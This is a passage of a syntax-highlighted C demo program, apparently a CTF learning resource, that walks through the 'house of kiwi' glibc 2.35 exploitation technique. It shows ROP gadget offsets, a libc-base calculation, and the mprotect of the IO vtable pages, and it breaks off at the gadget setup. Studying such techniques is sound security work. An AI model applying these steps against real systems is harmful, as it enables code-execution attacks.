class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdi_ret libc_base + 0x000000000002a3e5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdx_r12 libc_base + 0x000000000011f497</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rsi_ret libc_base + 0x000000000002be51</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rax_ret libc_base + 0x0000000000045eb0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_ret libc_base + 0x0000000000091396</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ret pop_rdi_ret+1</span></span><br><span class="line"><span class="type">size_t</span> libc_base;</span><br><span class="line"><span class="type">size_t</span> ROP[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">char</span> FLAG[<span class="number">0x100</span>] = <span class="string">&quot;./flag\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHello there! Today let&#x27;s learn something about house of kiwi.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m本程序演示house of kiwi的利用流程。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[1;32mModified from demo in https://www.anquanke.com/post/id/235598.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[1;32m改编自https://www.anquanke.com/post/id/235598的demo程序。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[1;31mTested in Ubuntu 22.04, glibc version: Ubuntu GLIBC 2.35-0ubuntu3.1\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[1;31m测试环境：Ubuntu 22.04，glibc版本为2.35-0ubuntu3.1\033[0m&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mFirst let&#x27;s make clear how to exploit.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m首先让我们搞清楚这种利用方式是如何工作的。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSame as house of emma, house of kiwi has a stable call chain.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m与house of emma相同，house of kiwi有一条稳定的函数调用链。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIt started with function sysmalloc, which can be triggered when we need top chunk.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这条调用链开始于sysmalloc函数，可以通过向top chunk分配chunk来触发该函数。\033[0m&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn function sysmalloc, there is a check for page alignment of top chunk: \n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在函数sysmalloc中，有一个检查top chunk页对齐的代码片段: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 2617, /malloc/malloc.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m  assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||\n&quot;</span></span><br><span class="line">         <span class="string">&quot;          ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;           prev_inuse (old_top) &amp;&amp;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;           ((unsigned long) old_end &amp; (pagesize - 1)) == 0));\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe function assert here in malloc.c is a bit different from that in other file.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这个malloc.c中的assert函数与其他文件中的函数不太一样。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mBecause in malloc.c there is a #define statement: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m因为在malloc.c中有一个#define语句: \n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 292, /malloc/malloc.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m# define __assert_fail(assertion, file, line, function)\t\t\t\\\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t __malloc_assert(assertion, file, line, function)\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that if the assertion in malloc.c failed, it will call function __malloc_assert.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以如果这个检查失败了，那么它就会调用__malloc_assert.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe content of function __malloc_assert is: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m__malloc_assert函数的内容为: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 297, /malloc/malloc.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34mstatic void\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__malloc_assert (const char *assertion, const char *file, unsigned int line,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t const char *function)\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  (void) __fxprintf (NULL, \&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\\n\&quot;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t     __progname, __progname[0] ? \&quot;: \&quot; : \&quot;\&quot;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t     file, line,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t     function ? function : \&quot;\&quot;, function ? \&quot;: \&quot; : \&quot;\&quot;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t     assertion);\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  fflush (stderr);\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  abort ();\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#125;\033[0m\n&quot;</span>);</span><br><span class="line">         </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWhile in function fflush, it will jump to a function, and that is our chance.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m函数fflush中会跳转到另一个函数，这就是我们利用的机会。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mLet&#x27;s have a look at function fflush:\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m让我们看一下fflush的内容：\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 33, /assert/assert.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m#define fflush(s) _IO_fflush (s)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 30, /libio/iofflush.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34mint\n&quot;</span></span><br><span class="line">         <span class="string">&quot;_IO_fflush (FILE *fp)\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  if (fp == NULL)\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    return _IO_flush_all ();\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  else\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;      int result;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;      CHECK_FILE (fp, EOF);\n&quot;</span></span><br><span class="line">         <span class="string">&quot;      _IO_acquire_lock (fp);\n&quot;</span></span><br><span class="line">         <span class="string">&quot;      \033[1;31mresult = _IO_SYNC (fp) ? EOF : 0;\033[34m\n&quot;</span></span><br><span class="line">         <span class="string">&quot;      _IO_release_lock (fp);\n&quot;</span></span><br><span class="line">         <span class="string">&quot;      return result;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#125;\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mPlease pay attention to the red code, here is its disassembly result:\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m注意标红的代码，下面是这段代码的反汇编结果（pwndbg调试界面部分截取）\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m   0x7ffff7e00208 &lt;__GI__IO_fflush+88&gt;:\t\033[1;31mlea    rdx,[rip+0x1967f1]        # 0x7ffff7f96a00 &lt;_IO_helper_jumps&gt;\033[34m\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   0x7ffff7e0020f &lt;__GI__IO_fflush+95&gt;:\tlea    rax,[rip+0x197552]        # 0x7ffff7f97768\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   0x7ffff7e00216 &lt;__GI__IO_fflush+102&gt;:\tsub    rax,rdx\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   0x7ffff7e00219 &lt;__GI__IO_fflush+105&gt;:\tmov    rcx,rbp\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   0x7ffff7e0021c &lt;__GI__IO_fflush+108&gt;:\tsub    rcx,rdx\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   0x7ffff7e0021f &lt;__GI__IO_fflush+111&gt;:\tcmp    rax,rcx\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   0x7ffff7e00222 &lt;__GI__IO_fflush+114&gt;:\tjbe    0x7ffff7e00268 &lt;__GI__IO_fflush+184&gt;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   0x7ffff7e00224 &lt;__GI__IO_fflush+116&gt;:\tmov    rdi,rbx\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   0x7ffff7e00227 &lt;__GI__IO_fflush+119&gt;:\t\033[1;31mcall   QWORD PTR [rbp+0x60]\033[34m\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   0x7ffff7e0022a &lt;__GI__IO_fflush+122&gt;:\tneg    eax\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   0x7ffff7e0022c &lt;__GI__IO_fflush+124&gt;:\tsbb    r12d,r12d\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   0x7ffff7e0022f &lt;__GI__IO_fflush+127&gt;:\ttest   DWORD PTR [rbx],0x8000\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   0x7ffff7e00235 &lt;__GI__IO_fflush+133&gt;:\tjne    0x7ffff7e00258 &lt;__GI__IO_fflush+168&gt;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   0x7ffff7e00237 &lt;__GI__IO_fflush+135&gt;:\tmov    rdi,QWORD PTR [rbx+0x88]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   0x7ffff7e0023e &lt;__GI__IO_fflush+142&gt;:\tmov    eax,DWORD PTR [rdi+0x4]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   0x7ffff7e00241 &lt;__GI__IO_fflush+145&gt;:\tsub    eax,0x1\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   0x7ffff7e00244 &lt;__GI__IO_fflush+148&gt;:\tmov    DWORD PTR [rdi+0x4],eax\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   0x7ffff7e00247 &lt;__GI__IO_fflush+151&gt;:\tjne    0x7ffff7e00258 &lt;__GI__IO_fflush+168&gt;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   0x7ffff7e00249 &lt;__GI__IO_fflush+153&gt;:\tmov    QWORD PTR [rdi+0x8],0x0\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mAs you can see, it calls [rbp+0x60], let&#x27;s execute the code until there...\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m可以看到这里call了[rbp+0x60]，我们调试到这里看一下rbp的值...\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[1;33m R14  0x1000\n&quot;</span></span><br><span class="line">         <span class="string">&quot; R15  0xff\n&quot;</span></span><br><span class="line">         <span class="string">&quot;*RBP  0x7ffff7f97600 (_IO_file_jumps) ◂— 0x0\n&quot;</span></span><br><span class="line">         <span class="string">&quot;*RSP  0x7fffffffdc60 —▸ 0x7ffff7f9ac80 (main_arena) ◂— 0x0\n&quot;</span></span><br><span class="line">         <span class="string">&quot;*RIP  0x7ffff7e00227 (fflush+119) ◂— call   qword ptr [rbp + 0x60]\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe rbp points to a struct called _IO_file_jumps, let&#x27;s see what it looks like in IDA:\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mrbp指向了一个名为_IO_file_jumps的结构，看一下它在IDA中的内容：\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m__libc_IO_vtables:0000000000216600 _IO_file_jumps  dq 0                    ; DATA XREF: LOAD:0000000000014598↑o\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000216600                                         ; sub_29CA0+B↑o ...\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000216608                 dq 0\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000216610                 dq offset _IO_file_finish\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000216618                 dq offset _IO_file_overflow\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000216620                 dq offset _IO_file_underflow\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000216628                 dq offset _IO_default_uflow\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000216630                 dq offset _IO_default_pbackfail\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000216638                 dq offset _IO_file_xsputn\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000216640                 dq offset sub_8B330\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000216648                 dq offset _IO_file_seekoff\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000216650                 dq offset sub_8E530\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000216658                 dq offset _IO_file_setbuf\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\033[1;31m__libc_IO_vtables:0000000000216660                 dq offset _IO_file_sync\033[34m\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000216668                 dq offset _IO_file_doallocate\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000216670                 dq offset _IO_file_read\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000216678                 dq offset _IO_file_write\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000216680                 dq offset _IO_file_seek\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000216688                 dq offset _IO_file_close\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000216690                 dq offset _IO_file_stat\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000216698                 dq offset sub_8F4A0\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:00000000002166A0                 dq offset sub_8F4B0\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:00000000002166A8                 align 20h\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo it actually calls the function _IO_file_sync.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m因此这里实际上是在调用_IO_file_sync函数。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHouse of kiwi just changed the value there to anywhere we want.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mhouse of kiwi实际上就是将这里的值进行修改。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn CTF problems, we usually changed it into setcontext+61 to trigger stack pivoting.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在CTF赛题中，我们一般将这里的值修改为setcontext+61来触发栈迁移。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mBut there is one thing to notice, if you use command &#x27;vmmap&#x27; in pwndbg,\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m但这里有一点需要注意，如果在pwndbg中使用vmmap命令，\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mYou will find that the page where _IO_file_jumps is located in was not able to write.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m你会发现_IO_file_jumps所在的页并不具有写权限（这一点笔者在其他有关house of kiwi的文章中并没有找到原因，不知为何）\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo we had better change the privilege of that page through function mprotect().\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m因此我们最好使用mprotect函数来修改一下这一页的访问权限。\033[0m\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen, let&#x27;s have a look at rdx, which is a key register for stack pivoting.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们注意一下rdx寄存器的值，这是我们进行栈迁移的关键寄存器。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHave a look at disassembly result of function setcontext: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m看一下setcontext函数的汇编: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m.text:0000000000053A6D                 \033[1;31mmov     rsp, [rdx+0A0h]\033[34m\n&quot;</span></span><br><span class="line">         <span class="string">&quot;.text:0000000000053A74                 mov     rbx, [rdx+80h]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;.text:0000000000053A7B                 mov     rbp, [rdx+78h]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;.text:0000000000053A7F                 mov     r12, [rdx+48h]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;.text:0000000000053A83                 mov     r13, [rdx+50h]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;.text:0000000000053A87                 mov     r14, [rdx+58h]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;.text:0000000000053A8B                 mov     r15, [rdx+60h]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;.text:0000000000053A8F                 test    dword ptr fs:48h, 2\n&quot;</span></span><br><span class="line">         <span class="string">&quot;.text:0000000000053A9B                 jz      loc_53B56\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t\t......\n&quot;</span></span><br><span class="line">         <span class="string">&quot;.text:0000000000053B56                 \033[1;31mmov     rcx, [rdx+0A8h]\033[34m\n&quot;</span></span><br><span class="line">         <span class="string">&quot;.text:0000000000053B5D                 \033[1;31mpush    rcx\033[34m\n&quot;</span></span><br><span class="line">         <span class="string">&quot;.text:0000000000053B5E                 mov     rsi, [rdx+70h]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;.text:0000000000053B62                 mov     rdi, [rdx+68h]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;.text:0000000000053B66                 mov     rcx, [rdx+98h]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;.text:0000000000053B6D                 mov     r8, [rdx+28h]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;.text:0000000000053B71                 mov     r9, [rdx+30h]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;.text:0000000000053B75                 mov     rdx, [rdx+88h]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;.text:0000000000053B75 ; &#125; // starts at 53A30\n&quot;</span></span><br><span class="line">         <span class="string">&quot;.text:0000000000053B7C ; __unwind &#123;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;.text:0000000000053B7C                 xor     eax, eax\n&quot;</span></span><br><span class="line">         <span class="string">&quot;.text:0000000000053B7E                 retn\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mYou can see the rsp was changed into [rdx+0xA0]\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m你可以看到rsp被修改为[rdx+0xA0]的值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWhen calling _IO_file_sync, the value of rdx is actually the address of _IO_helper_jumps.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在call _IO_file_sync时，rdx的值实际上是_IO_helper_jumps的地址。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThis value is stable and it&#x27;s right above _IO_file_jumps:\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这个值是稳定不变的，实际上这个结构体的地址就在_IO_file_jumps前面一点:\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m__libc_IO_vtables:0000000000215A00 qword_215A00    dq 0                    ; DATA XREF: sub_45390+1A3↑o\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000215A00                                         ; sub_5A980+1643↑o ...\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000215A08                 dq 0\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000215A10                 dq offset _IO_default_finish\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000215A18                 dq offset sub_722E0\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000215A20                 dq offset sub_8DDD0\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__libc_IO_vtables:0000000000215A28                 dq offset _IO_default_uflow\n&quot;</span></span><br><span class="line">         <span class="string">&quot;......\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that we need to change the value of [rdx+0xA0] and [rdx+0xA8] to complete ROP chain.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m因此我们需要修改[rdx+0xA0]和[rdx+0xA8]的值来构建ROP链。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mNow we are going to have a try.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m现在就让我们来演示一下。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mFirst we get the libc base through function setvbuf, which has the offset of 0x81670 in this libc.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m首先我们通过setvbuf函数获取libc加载基址，setvbuf函数在本libc中的偏移为0x81670。\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    libc_base  = ((<span class="type">size_t</span>)setvbuf) - <span class="number">0x81670</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31mLIBC: %#lx\n\033[0m&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThen we use mprotect function to add write privilege in address %p to %p.\n\033[0m&quot;</span>,</span><br><span class="line">           (<span class="type">void</span>*)(libc_base + <span class="number">0x215000</span>), (<span class="type">void</span>*)(libc_base + <span class="number">0x217000</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m然后我们将 %p 到 %p 的地址空间添加写权限。\n\033[0m&quot;</span>,</span><br><span class="line">           (<span class="type">void</span>*)(libc_base + <span class="number">0x215000</span>), (<span class="type">void</span>*)(libc_base + <span class="number">0x217000</span>));</span><br><span class="line">    mprotect((<span class="type">void</span>*)(libc_base + <span class="number">0x215000</span>), <span class="number">0x2000</span>, PROT_READ | PROT_WRITE);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> magic_gadget = libc_base + <span class="number">0x53A30</span> + <span class="number">61</span>; 